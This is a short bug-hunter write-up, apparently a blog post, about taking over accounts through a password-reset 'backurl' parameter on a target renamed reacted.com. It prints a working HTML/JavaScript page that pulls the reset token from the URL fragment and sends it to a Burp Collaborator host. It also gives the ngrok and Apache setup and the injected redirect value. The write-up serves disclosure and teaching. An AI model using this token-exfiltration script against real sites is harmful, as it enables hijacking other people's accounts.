Hello Hackers this is Hossam Shady and i am gonna discuss how could i hack thousands of domains and subdomains with account takeover zero day vulnerability . For me i focus on functions and how to bypass it . let’s call the target reacted.com . i made account with this site and started digging in password functionality . changing the headers to my burp collaborator but in vain . after that started digging and replacing the email of the victim with my email by all techniques but in vain (i will make full write-up for all advanced techniques for reset password function cracking ) . i starting fuzzing the body payloads with burpsuite Param miner => guess params => guess everything . after sometime found parameter called “backurl” and but it in my request while resetting the password and put my burp collaborator and boom the burp url was sent to the vicitm but all of the above was not the hard and difficult part .

the difficult and challenging part is that after clicking on that link there was interaction reaching my burp collaborator but without the token . then all what i did is in vain but no impossible for me to leave it . started searching for any solution to bypass it and after deep search found that i can use two servers to receive the token as in my terminal i started local server with

service apache2 start

after that i started ngrok

ngrok http 80

and saved the file /var/www/html/index.html

<!DOCTYPE html>  
<html>  
<head>  
    <title>Fragment Identifier Sender</title>  
</head>  
<body>  
    <script>    var fragment = window.location.hash.substr(2);   
      
    var url = "https://burpcollaborator.net/?x=" + encodeURIComponent(fragment);  
    var xhr = new XMLHttpRequest();  
    xhr.open("GET", url, true);  
    xhr.send();   </script>  
   </body>  
   </html>

this script would strip the token from the url and then send it back to my burp collaborator

then i injected the ngrok link in the request backurl=http://link.ngrok.com

once victim clicks the link that reached his account the script i made in my local machine would take the token and send it to my burpsuite collaborator and with that i could make account takeover

the Problem was bigger as the framework was vulnerable to that and checked and found all sites with the same framework is vulnerable to the same vulnerability and till yet they are updating and patching it
